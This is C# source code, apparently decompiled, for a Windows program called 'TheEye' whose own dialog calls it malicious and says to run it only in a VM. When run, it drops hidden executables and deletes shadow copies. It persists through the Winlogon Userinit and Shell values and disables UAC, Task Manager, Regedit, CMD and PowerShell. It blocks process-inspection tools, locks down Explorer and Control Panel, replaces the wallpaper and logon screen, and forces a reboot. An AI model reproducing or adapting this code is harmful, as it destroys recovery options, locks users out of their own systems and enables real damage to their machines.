using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Win32.TheEye.Properties;

namespace Win32.TheEye
{
  public class warning : Form
  {
    private static readonly uint SPI_SETDESKWALLPAPER = 20;
    private static readonly uint SPIF_UPDATEINIFILE = 1;
    private static readonly uint SPIF_SENDWININICHANGE = 2;
    public static Random rnd = new Random();
    public static string theeyedir = Variables.theeyedir[warning.rnd.Next(0, Variables.theeyedir.Length)];
    public static string windefdir = Variables.windefdir[warning.rnd.Next(0, Variables.windefdir.Length)];
    private IContainer components;
    private StatusStrip statusStrip1;
    private Button button1;
    private Button button2;
    private Label label1;
    private Label label2;
    private Label label3;
    private ToolStripStatusLabel toolStripStatusLabel1;
    private ToolStripStatusLabel toolStripStatusLabel2;
    private CheckBox checkBox1;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

    private void SetWallpaper(string path, bool Streched, bool Tile)
    {
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
      int num;
      if (Streched)
      {
        RegistryKey registryKey2 = registryKey1;
        num = 2;
        string str = num.ToString();
        registryKey2.SetValue("WallpaperStyle", (object) str);
      }
      else
      {
        RegistryKey registryKey3 = registryKey1;
        num = 0;
        string str = num.ToString();
        registryKey3.SetValue("WallpaperStyle", (object) str);
      }
      if (Tile)
      {
        RegistryKey registryKey4 = registryKey1;
        num = 1;
        string str = num.ToString();
        registryKey4.SetValue("TileWallpaper", (object) str);
      }
      else
      {
        RegistryKey registryKey5 = registryKey1;
        num = 0;
        string str = num.ToString();
        registryKey5.SetValue("TileWallpaper", (object) str);
      }
      warning.SystemParametersInfo(warning.SPI_SETDESKWALLPAPER, 0U, path, warning.SPIF_UPDATEINIFILE | warning.SPIF_SENDWININICHANGE);
    }

    private void disableapp(string Name, string Extension)
    {
      RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
      if (subKey1.GetValue("DisallowRun") != null && (int) subKey1.GetValue("DisallowRun") == 1)
      {
        RegistryKey subKey2 = subKey1.CreateSubKey("DisallowRun");
        if (subKey2.GetValue(Name) == null)
        {
          if (Extension == null)
            subKey2.SetValue(Name, (object) (Name + ".exe"));
          else
            subKey2.SetValue(Name, (object) (Name + "." + Extension));
          subKey2.Close();
          subKey2.Dispose();
        }
      }
      else
        subKey1.SetValue("DisallowRun", (object) 1, RegistryValueKind.DWord);
      subKey1.Close();
      subKey1.Dispose();
    }

    private void WinlogonStartup(string StartupTo, string path)
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
      string str = registryKey.GetValue(StartupTo).ToString();
      if (path == null)
        return;
      registryKey.SetValue(StartupTo, (object) (str + ", " + path));
      registryKey.Close();
      registryKey.Dispose();
    }

    private void DisableTaskMgrandRegEdit()
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      subKey.SetValue("DisableTaskMgr", (object) 1);
      subKey.SetValue("DisableRegistryTools", (object) 1);
      subKey.Close();
      subKey.Dispose();
    }

    private void DisableCMD()
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System", true);
      subKey.SetValue(nameof (DisableCMD), (object) 1);
      subKey.Close();
    }

    private void UAC()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
      registryKey.SetValue("EnableLUA", (object) 0, RegistryValueKind.DWord);
      registryKey.SetValue("PromptOnSecureDesktop", (object) 0);
      registryKey.SetValue("ConsentPromptBehaviorAdmin", (object) 0);
      registryKey.Close();
      registryKey.Dispose();
    }

    private void SysAllDisable()
    {
      RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", true);
      RegistryKey subKey2 = subKey1.CreateSubKey("Explorer", true);
      subKey2.SetValue("NoRun", (object) 1);
      subKey2.SetValue("NoFind", (object) 1);
      subKey2.SetValue("NoFileMenu", (object) 1);
      subKey2.SetValue("NoFolderOptions", (object) 1);
      subKey2.SetValue("NoCommonGroups", (object) 1);
      subKey2.SetValue("NoControlPanel", (object) 1);
      subKey2.SetValue("NoSecurityTab", (object) 1);
      subKey2.SetValue("NoViewContextMenu", (object) 1);
      subKey2.SetValue("NoDrives", (object) 4);
      subKey2.SetValue("NoViewOnDrive", (object) 4);
      subKey2.Close();
      subKey2.Dispose();
      RegistryKey subKey3 = subKey1.CreateSubKey("Uninstall", true);
      subKey3.SetValue("NoAddRemovePrograms", (object) 1);
      subKey3.Close();
      subKey3.Dispose();
      subKey1.Close();
      subKey1.Dispose();
      RegistryKey subKey4 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC", true);
      subKey4.SetValue("RestrictToPermittedSnapins", (object) 1);
      subKey4.Close();
      subKey4.Dispose();
    }

    private void ChangeLogonBackground()
    {
      File.WriteAllBytes("C:\\Windows\\debug\\BG.jpg", Resources.LogonBackground);
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = Environment.GetEnvironmentVariable("windir") + "\\debug\\CHLogOn.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Verb = "runas"
      };
      process.Start();
      process.WaitForExit();
    }

    private void UnpackFiles()
    {
      IntPtr ptr = new IntPtr();
      int num = warning.Wow64DisableWow64FsRedirection(ref ptr) ? 1 : 0;
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\wcmd.exe", Resources.wcmd);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\main.bs7", Resources.TheEyeBoot);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\CHLogOn.exe", Resources.CHLogOn);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\Wall.jpg", Resources.theeyewallpaper);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\note.txt", Resources.note);
      if (num == 0)
        throw new Exception("Unpack to Wow64Sys");
      Directory.CreateDirectory(warning.theeyedir);
      File.WriteAllBytes(warning.theeyedir + "\\theeye.exe", Resources.theeye);
      Directory.CreateDirectory(warning.windefdir);
      File.WriteAllBytes(warning.windefdir + "\\windef.exe", Resources.windef);
      Directory.CreateDirectory(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs");
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr1.gif", Resources.scr1gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr1.wav", Resources.scr1wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr2.gif", Resources.scr2gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr2.wav", Resources.scr2wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr3.gif", Resources.scr3gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr3.wav", Resources.scr3wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr4.gif", Resources.scr4gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr4.wav", Resources.scr4wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr5.gif", Resources.scr5gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr5.wav", Resources.scr5wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr6.gif", Resources.scr6gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr6.wav", Resources.scr6wav);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr7.gif", Resources.scr7gif);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("windir") + "\\debug\\defenderlogs\\scr7.wav", Resources.scr7wav);
      Directory.CreateDirectory(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs");
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_1.txt", Resources.log1);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_2.txt", Resources.log2);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_3.txt", Resources.log3);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_4.txt", Resources.log4);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_5.txt", Resources.log5);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_6.txt", Resources.log6);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_7.txt", Resources.log7);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_8.txt", Resources.log8);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_9.txt", Resources.log9);
      File.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\MigHostLogs\\MigHostLogs_10.txt", Resources.log10);
    }

    private void RemoveFiles()
    {
      File.Delete(Environment.GetEnvironmentVariable("windir") + "\\debug\\wcmd.exe");
      File.Delete(Environment.GetEnvironmentVariable("windir") + "\\debug\\main.bs7");
      File.Delete(Environment.GetEnvironmentVariable("windir") + "\\debug\\BG.jpg");
      File.Delete(Environment.GetEnvironmentVariable("windir") + "\\debug\\CHLogOn.exe");
    }

    public warning() => this.InitializeComponent();

    private void Button2_Click(object sender, EventArgs e) => Application.Exit();

    private void CheckBox1_CheckedChanged(object sender, EventArgs e) => this.button1.Enabled = this.checkBox1.Checked;

    private void Button1_Click(object sender, EventArgs e)
    {
      this.Hide();
      RegistryKey subKey1 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true);
      this.UnpackFiles();
      Process.Start(new ProcessStartInfo()
      {
        FileName = Environment.GetEnvironmentVariable("windir") + "\\notepad.exe",
        Arguments = Environment.GetEnvironmentVariable("temp") + "\\note.txt"
      });
      this.ChangeLogonBackground();
      this.DisableTaskMgrandRegEdit();
      subKey1.SetValue("WarnEULA", (object) 1);
      subKey1.Close();
      Process process = new Process();
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      processStartInfo.FileName = Environment.GetEnvironmentVariable("windir") + "\\debug\\wcmd.exe";
      processStartInfo.Arguments = Environment.GetEnvironmentVariable("windir") + "\\debug\\main.bs7";
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.Verb = "runas";
      process.StartInfo = processStartInfo;
      process.Start();
      process.WaitForExit();
      processStartInfo.FileName = Environment.GetEnvironmentVariable("windir") + "\\System32\\wbem\\wmic.exe";
      processStartInfo.Arguments = "shadowcopy delete";
      process.Start();
      process.WaitForExit();
      this.RemoveFiles();
      this.WinlogonStartup("Userinit", warning.theeyedir + "\\theeye.exe");
      this.WinlogonStartup("Shell", warning.windefdir + "\\windef.exe");
      using (RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true))
      {
        subKey2.SetValue("EyeDir", (object) (warning.theeyedir + "\\theeye.exe"));
        subKey2.Close();
        subKey2.Dispose();
      }
      this.UAC();
      this.SysAllDisable();
      this.DisableCMD();
      this.disableapp(" &debug", (string) null);
      this.disableapp("powershell", (string) null);
      this.disableapp("taskkill", (string) null);
      this.disableapp("ProcessHacker", (string) null);
      this.disableapp("msconfig", (string) null);
      this.disableapp("procexp", (string) null);
      this.SetWallpaper(Environment.GetEnvironmentVariable("windir") + "\\debug\\Wall.jpg", true, false);
      new Reboot().halt(true, true);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.statusStrip1 = new StatusStrip();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.button1 = new Button();
      this.button2 = new Button();
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.checkBox1 = new CheckBox();
      this.statusStrip1.SuspendLayout();
      this.SuspendLayout();
      this.statusStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.toolStripStatusLabel1,
        (ToolStripItem) this.toolStripStatusLabel2
      });
      this.statusStrip1.Location = new Point(0, 109);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.Size = new Size(577, 24);
      this.statusStrip1.TabIndex = 0;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripStatusLabel1.BorderSides = ToolStripStatusLabelBorderSides.Right;
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(72, 19);
      this.toolStripStatusLabel1.Text = "TheEye v1.0";
      this.toolStripStatusLabel2.BorderSides = ToolStripStatusLabelBorderSides.Left;
      this.toolStripStatusLabel2.Margin = new Padding(371, 3, 0, 2);
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.Size = new Size(120, 19);
      this.toolStripStatusLabel2.Text = "c0d9d by DesConnet";
      this.button1.Enabled = false;
      this.button1.Location = new Point(198, 81);
      this.button1.Name = "button1";
      this.button1.Size = new Size(75, 23);
      this.button1.TabIndex = 1;
      this.button1.Text = "Run";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1_Click);
      this.button2.Location = new Point(305, 81);
      this.button2.Name = "button2";
      this.button2.Size = new Size(75, 23);
      this.button2.TabIndex = 2;
      this.button2.Text = "Exit";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.Button2_Click);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label1.Location = new Point(245, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(92, 25);
      this.label1.TabIndex = 3;
      this.label1.Text = "Warning!";
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label2.Location = new Point(12, 44);
      this.label2.Name = "label2";
      this.label2.Size = new Size(557, 17);
      this.label2.TabIndex = 4;
      this.label2.Text = "This program is malicious. The author does not bear any responsibility for your actions.";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label3.Location = new Point(29, 61);
      this.label3.Name = "label3";
      this.label3.Size = new Size(519, 17);
      this.label3.TabIndex = 5;
      this.label3.Text = "You run it at your own risk (Only on VM). If you started it by mistake then click exit\r\n";
      this.checkBox1.AutoSize = true;
      this.checkBox1.Location = new Point(15, 85);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(59, 17);
      this.checkBox1.TabIndex = 6;
      this.checkBox1.Text = "I agree";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.checkBox1.CheckedChanged += new EventHandler(this.CheckBox1_CheckedChanged);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(577, 133);
      this.Controls.Add((Control) this.checkBox1);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.statusStrip1);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (warning);
      this.Opacity = 0.8;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "TheEye (Beta)";
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
